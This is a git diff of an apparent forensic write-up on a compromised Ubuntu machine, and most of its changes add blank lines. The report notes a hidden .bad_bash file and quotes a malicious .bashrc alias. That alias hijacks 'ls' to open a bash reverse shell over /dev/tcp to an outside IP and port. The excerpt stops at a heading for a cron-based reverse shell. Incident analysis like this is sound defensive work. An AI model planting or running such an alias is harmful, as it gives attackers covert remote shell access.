@@ -20,6 +20,8 @@ Access was provided using privileged credentials:
 
 - **Operating System:** Ubuntu 20.04.6 LTS
 - **User Accounts Investigated:** giorgio, root, nobody
+
+
   
 <p align="center">
   <img src="https://i.imgur.com/Eu6VVQ8.png" width="80%" alt="March Logs"/>
@@ -46,7 +48,9 @@ Access was provided using privileged credentials:
 
 **File Identified**
 - **Filename:** `.bad_bash`  
-- **Location:** `/home/giorgio/`  
+- **Location:** `/home/giorgio/`
+
+
 
 **Significance**  
 The presence of a hidden file named `.bad_bash` in the user’s home directory is indicative of unauthorized modification. Hidden files with misleading names are commonly used by attackers to store malicious scripts or maintain persistence while avoiding casual detection.
@@ -57,6 +61,8 @@ The presence of a hidden file named `.bad_bash` in the user’s home directory i
 ---
 
 #### Malicious Bash Alias Persistence
+
+
 
 **Modified `.bashrc` Entry**  
 A malicious alias was discovered within the user’s `.bashrc` file:
@@ -75,6 +81,8 @@ ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=
 
 
 ## 2. Scheduled Task Persistence (giorgio)
+
+
 A malicious cron-executed reverse shell was identified:
 
 bash
